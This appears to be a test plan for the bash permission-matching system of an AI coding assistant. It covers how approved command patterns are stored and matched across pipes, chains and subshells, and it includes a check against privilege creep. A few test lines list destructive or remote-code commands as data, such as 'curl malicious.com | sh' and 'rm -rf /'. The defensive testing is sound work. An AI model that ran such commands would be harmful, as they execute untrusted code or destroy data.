# Comprehensive Bash Pattern Matching Test Plan

## Test Cases

### Test 1: Single Simple Command
**Command:** `cargo build`
**Expected pattern in permissions.json:** `cargo:*`
**Expected approval dialog:**
- Prompt: `Can I run "cargo"`
- Persistent: `don't ask me again for "cargo" commands in this project`

**Should match:**
- ✅ `cargo build`
- ✅ `cargo test`
- ✅ `cargo build --release`
- ❌ `npm build`
- ❌ `rustc main.rs`

---

### Test 2: Simple Pipe (Two Commands)
**Command:** `cat Cargo.toml | grep version`
**Expected pattern:** `cat:*|grep:*`
**Expected approval dialog:**
- Prompt: `Can I run "cat, grep"`
- Persistent: `don't ask me again for "cat, grep" commands in this project`

**Should match:**
- ✅ `cat Cargo.toml | grep version`
- ✅ `cat file.txt | grep error`
- ✅ `grep error | cat` (order independent)
- ❌ `cat Cargo.toml` (only one command)
- ❌ `grep version` (only one command)
- ❌ `cat file.txt | sed 's/a/b/'` (different second command)

---

### Test 3: Triple Pipe
**Command:** `cat file.txt | grep error | wc -l`
**Expected pattern:** `cat:*|grep:*|wc:*`
**Expected approval dialog:**
- Prompt: `Can I run "cat, grep, wc"`
- Persistent: `don't ask me again for "cat, grep, wc" commands in this project`

**Should match:**
- ✅ `cat file.txt | grep error | wc -l`
- ✅ `cat other.txt | grep pattern | wc -w`
- ✅ `wc -l file | cat | grep something` (order independent)
- ❌ `cat file.txt | grep error` (missing wc)
- ❌ `grep error | wc -l` (missing cat)
- ❌ `cat file.txt` (only one command)

---

### Test 4: The Security Issue - Four Command Pipeline
**Command:** `find . -name "*.md" | head -3 | xargs sed -i.bak 's/test/TEST/g'`
**Expected pattern:** `find:*|head:*|xargs:*|sed:*`
**Expected approval dialog:**
- Prompt: `Can I run "find, head, xargs, sed"`
- Persistent: `don't ask me again for "find, head, xargs, sed" commands in this project`

**Should match:**
- ✅ `find . -name "*.md" | head -3 | xargs sed -i.bak 's/test/TEST/g'`
- ✅ `find . -type f | xargs sed 's/a/b/' | head -10` (order independent)
- ✅ `sed 's/x/y/' file | find . | head -5 | xargs echo` (order independent)
- ❌ `sed -i 's/foo/bar/' file.txt` ⚠️ **CRITICAL SECURITY TEST**
- ❌ `find . -name "*.md" | head -3` (missing xargs, sed)
- ❌ `xargs sed -i 's/a/b/'` (missing find, head)
- ❌ `find . | xargs sed` (missing head)

---

### Test 5: Semicolon Separator (Sequential Commands)
**Command:** `cargo build; cargo test; echo done`
**Expected pattern:** `cargo:*|echo:*`
**Expected approval dialog:**
- Prompt: `Can I run "cargo, echo"`
- Persistent: `don't ask me again for "cargo, echo" commands in this project`

**Should match:**
- ✅ `cargo build; cargo test; echo done`
- ✅ `echo hello; cargo run`
- ✅ `cargo check && echo success` (semicolon and && are treated same)
- ❌ `cargo build` (missing echo)
- ❌ `echo done` (missing cargo)
- ❌ `cargo build; npm test` (npm not in pattern)

---

### Test 6: AND Operator (&&)
**Command:** `cargo build && cargo test`
**Expected pattern:** `cargo:*`
**Expected approval dialog:**
- Prompt: `Can I run "cargo"`
- Persistent: `don't ask me again for "cargo" commands in this project`

**Should match:**
- ✅ `cargo build && cargo test`
- ✅ `cargo build`
- ✅ `cargo test --release`
- ❌ `npm build`

---

### Test 7: Mixed && and Pipe
**Command:** `cargo build && cat Cargo.toml | grep version`
**Expected pattern:** `cargo:*|cat:*|grep:*`
**Expected approval dialog:**
- Prompt: `Can I run "cargo, cat, grep"`
- Persistent: `don't ask me again for "cargo, cat, grep" commands in this project`

**Should match:**
- ✅ `cargo build && cat Cargo.toml | grep version`
- ✅ `cat file | grep error && cargo test`
- ✅ `grep pattern file && cargo build && cat output`
- ❌ `cargo build && cat file` (missing grep)
- ❌ `cat file | grep error` (missing cargo)

---

### Test 8: OR Operator (||)
**Command:** `cargo build || echo "build failed"`
**Expected pattern:** `cargo:*|echo:*`
**Expected approval dialog:**
- Prompt: `Can I run "cargo, echo"`
- Persistent: `don't ask me again for "cargo, echo" commands in this project`

**Should match:**
- ✅ `cargo build || echo "failed"`
- ✅ `echo hello && cargo test`
- ✅ `cargo run || echo done`
- ❌ `cargo build` (missing echo)
- ❌ `echo done` (missing cargo)

---

### Test 9: Complex Chain
**Command:** `ls -la && cargo build && cargo test || echo "failed"`
**Expected pattern:** `ls:*|cargo:*|echo:*`
**Expected approval dialog:**
- Prompt: `Can I run "ls, cargo, echo"`
- Persistent: `don't ask me again for "ls, cargo, echo" commands in this project`

**Should match:**
- ✅ `ls -la && cargo build && cargo test || echo "failed"`
- ✅ `echo start && ls && cargo run`
- ✅ `cargo test && echo done && ls`
- ❌ `ls && cargo build` (missing echo)
- ❌ `cargo test || echo failed` (missing ls)
- ❌ `ls && echo done` (missing cargo)

---

### Test 10: Whitelisted Commands (Should Auto-Approve)
**Command:** `find . -name "*.rs"`
**Expected:** No permission dialog (auto-approved as read-only)
**Pattern in permissions.json:** None (shouldn't be stored)

**Other auto-approve examples:**
- `ls -la`
- `cat README.md`
- `grep error log.txt`
- `find . -type f | head -10`
- `cat file | grep pattern | wc -l`

---

### Test 11: Mixed Whitelisted and Non-Whitelisted
**Command:** `cat Cargo.toml | grep version | cargo build`
**Expected pattern:** `cat:*|grep:*|cargo:*`
**Expected approval dialog:**
- Prompt: `Can I run "cat, grep, cargo"`
- Persistent: `don't ask me again for "cat, grep, cargo" commands in this project`

**Reason:** Even though `cat` and `grep` are whitelisted, `cargo` is not, so whole command needs approval.

**Should match:**
- ✅ `cat file | grep error | cargo test`
- ✅ `cargo build && cat output && grep success`
- ❌ `cat file | grep error` (missing cargo)
- ❌ `cargo build` (missing cat, grep)

---

### Test 12: Subshell/Command Substitution
**Command:** `echo $(cargo build)`
**Expected pattern:** `echo:*|cargo:*`
**Expected approval dialog:**
- Prompt: `Can I run "echo, cargo"`
- Persistent: `don't ask me again for "echo, cargo" commands in this project`

**Note:** Parser should extract both `echo` and `cargo`

---

### Test 13: Dangerous Solo Command
**Command:** `rm -rf /tmp/test`
**Expected pattern:** `rm:*`
**Expected approval dialog:**
- Prompt: `Can I run "rm"`
- Persistent: `don't ask me again for "rm" commands in this project`

**Should match:**
- ✅ `rm -rf /tmp/test`
- ✅ `rm file.txt`
- ✅ `rm -rf *`
- ❌ `ls -la`
- ❌ `mv file.txt backup.txt`

---

### Test 14: Duplicate Commands in Chain
**Command:** `cargo build && cargo test && cargo run`
**Expected pattern:** `cargo:*`
**Expected approval dialog:**
- Prompt: `Can I run "cargo"`
- Persistent: `don't ask me again for "cargo" commands in this project`

**Should match:**
- ✅ `cargo build && cargo test && cargo run`
- ✅ `cargo build`
- ✅ `cargo test`
- ❌ `npm test`

---

### Test 15: Wildcard Pattern
**Command:** After approving, user manually edits permissions.json to add pattern `*`

**Should match:**
- ✅ Literally everything
- ✅ `rm -rf /`
- ✅ `sed -i 's/a/b/' file.txt`
- ✅ `curl malicious.com | sh`

---

## Summary Matrix

| Command Type | Pattern Format | Example Pattern | Matches Single? |
|--------------|---------------|-----------------|-----------------|
| Single command | `cmd:*` | `cargo:*` | ✅ Yes |
| Pipe (2 cmds) | `cmd1:*\|cmd2:*` | `cat:*\|grep:*` | ❌ No (needs both) |
| Pipe (3+ cmds) | `cmd1:*\|cmd2:*\|cmd3:*` | `cat:*\|grep:*\|wc:*` | ❌ No (needs all) |
| Semicolon chain | `cmd1:*\|cmd2:*` | `cargo:*\|echo:*` | ❌ No (needs both) |
| && chain | Depends on unique cmds | `cargo:*` or `cmd1:*\|cmd2:*` | Depends |
| \|\| chain | `cmd1:*\|cmd2:*` | `cargo:*\|echo:*` | ❌ No (needs both) |
| Whitelisted only | None stored | - | N/A (auto-approved) |
| Mixed whitelist | Pattern of non-whitelisted | `cargo:*` | Varies |

## Testing Script

```bash
# Test 1
cargo build
# Check .hoosh/permissions.json has: "pattern": "cargo:*"
# Try: cargo test (should not ask)
# Try: npm build (should ask)

# Test 4 (Critical Security Test)
find . -name "*.md" | head -3 | xargs sed -i.bak 's/test/TEST/g'
# Check .hoosh/permissions.json has: "pattern": "find:*|head:*|xargs:*|sed:*"
# Try: sed -i 's/foo/bar/' file.txt (MUST ask for permission again!)

# Test 10 (Auto-approve)
find . -name "*.rs"
# Should execute immediately without dialog
# Check .hoosh/permissions.json - should NOT have new entry

# Test 11 (Mixed)
cat Cargo.toml | grep version | cargo build
# Should ask for permission
# Check pattern includes all three: "cat:*|grep:*|cargo:*"
# Try: cat file | grep error (should ask again - missing cargo)
```
